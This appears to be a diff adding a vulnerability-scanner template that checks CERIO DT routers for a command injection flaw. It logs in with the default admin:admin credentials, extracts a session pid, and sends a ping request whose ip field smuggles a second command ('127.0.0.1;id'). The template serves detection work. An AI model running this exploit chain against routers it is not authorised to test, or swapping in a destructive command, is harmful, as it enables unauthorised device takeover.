@@ -1,0 +1,57 @@
+id: cerio-dt-command-exec
+
+info:
+  name: CERIO DT Series Routers Command Execution Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    CERIO DT series routers have an operation command injection vulnerability in certain versions. An attacker could exploit this vulnerability to execute commands such as `ping`.
+  tags: command-execution, router
+  reference:
+    - https://github.com/hook-s3c/CVE-2018-18852
+
+variables:
+  cmd: "id"
+
+http:
+  - raw:
+      - |
+        GET /cgi-bin/index.cgi?cgi=STATUS_FIXED_JSON HTTP/1.1
+        Host: {{Hostname}}
+        X-Requested-With: XMLHttpRequest
+        Authorization: Basic {{base64('admin:admin')}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "info"
+
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - '\"pid\":\"(\d+)\"'
+        name: pid
+        internal: true
+
+  - raw:
+      - |
+        POST /cgi-bin/Save.cgi?cgi=PING HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Authorization: Basic {{base64('admin:admin')}}
+
+        pid={{pid}}&ip=127.0.0.1;{{cmd}}&times=1
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "uid="
